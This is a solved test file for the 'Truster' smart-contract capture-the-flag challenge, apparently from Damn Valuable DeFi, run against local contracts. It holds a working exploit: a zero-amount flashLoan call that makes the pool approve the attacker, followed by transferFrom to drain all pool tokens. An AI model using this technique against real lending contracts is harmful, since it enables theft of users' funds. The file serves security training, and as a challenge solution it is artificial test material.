const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
		const beforeAllowance = await this.token.allowance(this.pool.address, attacker.address);
		console.log(`\nAllowance before = ${await ethers.utils.formatEther(beforeAllowance)} DVT`);
		
		console.log(`\nApproving ${await ethers.utils.formatEther(TOKENS_IN_POOL)} DVT for attacker...`);
		const APRV_API = [
			"function approve(address spender, uint256 amount)"
		];
		let iApprove = new ethers.utils.Interface(APRV_API);
		const encApprove = iApprove.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);

        await this.pool.flashLoan(
			'0',
			attacker.address,
			this.token.address,
			encApprove
        );
		console.log(`complete!`);

		const afterAllowance = await this.token.allowance(this.pool.address, attacker.address);
		console.log(`\nAllowance after = ${await ethers.utils.formatEther(afterAllowance)} DVT`);
		
		const beforePoolBal = await this.token.balanceOf(this.pool.address);
		const beforeBal = await this.token.balanceOf(attacker.address);
		console.log(`\nPool balance before = ${await ethers.utils.formatEther(beforePoolBal)} DVT`);
		console.log(`Attacker balance before = ${await ethers.utils.formatEther(beforeBal)} DVT`);
		
		console.log(`\nTransferring ${await ethers.utils.formatEther(TOKENS_IN_POOL)} DVT...`);
		this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
		console.log(`complete!`);

		const afterPoolBal = await this.token.balanceOf(this.pool.address);
		const afterBal = await this.token.balanceOf(attacker.address);
		console.log(`\nPool balance after = ${await ethers.utils.formatEther(afterPoolBal)} DVT`);
		console.log(`Attacker balance after = ${await ethers.utils.formatEther(afterBal)} DVT`);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

